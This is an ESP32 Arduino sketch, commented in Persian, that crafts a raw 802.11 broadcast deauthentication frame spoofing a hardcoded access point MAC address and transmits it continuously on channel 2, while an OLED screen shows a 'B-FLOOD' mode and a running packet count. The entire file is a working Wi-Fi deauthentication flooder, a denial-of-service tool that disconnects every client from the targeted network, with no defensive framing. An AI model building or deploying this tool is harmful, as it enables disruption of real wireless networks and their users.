#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include "esp_wifi.h"

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET    -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define WIFI_CHANNEL 2  // کانال وای‌فای شبکه هدف

// مک‌آدرس هات‌اسپات گوشی
uint8_t routerMac[6] = {0x9C, 0x50, 0xD1, 0x77, 0xBE, 0x25};

// ساختار فریم Broadcast Deauth
uint8_t broadcastDeauthPacket[26] = {
  0xC0, 0x00,                         // Frame Control: Management, Deauthentication
  0x3A, 0x01,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver MAC: Broadcast
  0x9C, 0x50, 0xD1, 0x77, 0xBE, 0x25, // Transmitter MAC (Router BSSID)
  0x9C, 0x50, 0xD1, 0x77, 0xBE, 0x25, // BSSID (Router MAC)
  0x00, 0x00,                         // Sequence Number
  0x07, 0x00                          // Reason Code
};

unsigned long sentPacketsCount = 0;
unsigned long lastDisplayUpdate = 0;

void setup() {
  Serial.begin(115200);

  Wire.begin(21, 22);
  Wire.setClock(100000); 

  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { 
    Serial.println(F("OLED init failed!"));
    for(;;);
  }
  
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);

  WiFi.mode(WIFI_STA);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_channel(WIFI_CHANNEL, WIFI_SECOND_CHAN_NONE);

  for(int i = 0; i < 6; i++) {
    broadcastDeauthPacket[10 + i] = routerMac[i]; // Transmitter
    broadcastDeauthPacket[16 + i] = routerMac[i]; // BSSID
  }
}

void loop() {
  for(int i = 0; i < 15; i++) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, broadcastDeauthPacket, sizeof(broadcastDeauthPacket), false) == ESP_OK) {
      sentPacketsCount++;
    }
  }

  unsigned long currentMillis = millis();
  if (currentMillis - lastDisplayUpdate >= 200) {
    lastDisplayUpdate = currentMillis;

    display.clearDisplay();
    
    display.drawFastHLine(0, 0, 10, SSD1306_WHITE);
    display.drawFastVLine(0, 0, 10, SSD1306_WHITE);
    display.drawFastHLine(118, 0, 10, SSD1306_WHITE);
    display.drawFastVLine(127, 0, 10, SSD1306_WHITE);
    display.drawFastHLine(0, 63, 10, SSD1306_WHITE);
    display.drawFastVLine(0, 54, 10, SSD1306_WHITE);
    display.drawFastHLine(118, 63, 10, SSD1306_WHITE);
    display.drawFastVLine(127, 54, 10, SSD1306_WHITE);

    display.setTextSize(1);
    display.setCursor(16, 4);
    display.print(F("CH 2 // BROADCAST"));

    display.drawFastHLine(0, 14, 128, SSD1306_WHITE);

    display.setCursor(6, 18);
    display.print(F("CHANNEL: 2"));

    display.setCursor(6, 28);
    display.print(F("MODE:    B-FLOOD"));

    display.drawRect(4, 38, 120, 22, SSD1306_WHITE);
    display.setCursor(8, 42);
    display.print(F("PKT:"));

    display.setTextSize(2);
    display.setCursor(38, 41);
    display.print(sentPacketsCount);

    if ((millis() / 150) % 2 == 0) {
      display.fillRect(114, 42, 6, 6, SSD1306_WHITE);
    }

    display.display();
  }
}
